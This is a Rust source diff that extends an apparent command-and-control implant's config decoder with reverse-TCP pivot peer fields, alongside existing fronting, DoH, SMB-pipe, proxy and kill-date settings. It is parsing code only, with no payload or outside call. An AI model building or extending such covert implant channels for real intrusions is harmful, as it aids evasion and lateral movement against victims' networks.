@@ -74,6 +74,12 @@ pub struct Config {
     /// (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY). When set, WinHTTP routes through
     /// this proxy.
     pub proxy_server: String,
+    // ---- Raw pivot channels (spec-3) ----
+    /// TCP pivot peer host (reverse_tcp). Empty = not configured (Tcp channel
+    /// rejects SetChannel and the dispatcher never transacts on it).
+    pub tcp_peer_host: String,
+    /// TCP pivot peer port. 0 = not configured.
+    pub tcp_peer_port: u16,
 }
 
 mod baked {
@@ -157,7 +163,7 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     // shape-mismatched blob must not silently zero the rotation/proxy/channel
     // fields (or, in config_placeholder, the kill-date).
     let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
-         rotation_hosts, fronting_host, proxy_server) =
+         rotation_hosts, fronting_host, proxy_server, tcp_peer_host, tcp_peer_port) =
         if r.remaining() > 0 {
             let primary_channel = r.u8()?;
             let fallback_bitmap = r.u8()?;
@@ -171,6 +177,12 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
             } else {
                 (String::new(), String::new(), String::new())
             };
+            // spec-3 raw pivot fields — further backward compat layer.
+            let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
+                (r.str()?, r.u16()?)
+            } else {
+                (String::new(), 0)
+            };
             (
                 primary_channel,
                 fallback_bitmap,
@@ -181,10 +193,12 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
                 rotation_hosts,
                 fronting_host,
                 proxy_server,
+                tcp_peer_host,
+                tcp_peer_port,
             )
         } else {
             (0, 0, String::new(), String::new(), String::new(), String::new(),
-             String::new(), String::new(), String::new())
+             String::new(), String::new(), String::new(), String::new(), 0)
         };
     Ok(Config {
         server_host,
@@ -203,5 +217,7 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
         rotation_hosts,
         fronting_host,
         proxy_server,
+        tcp_peer_host,
+        tcp_peer_port,
     })
 }
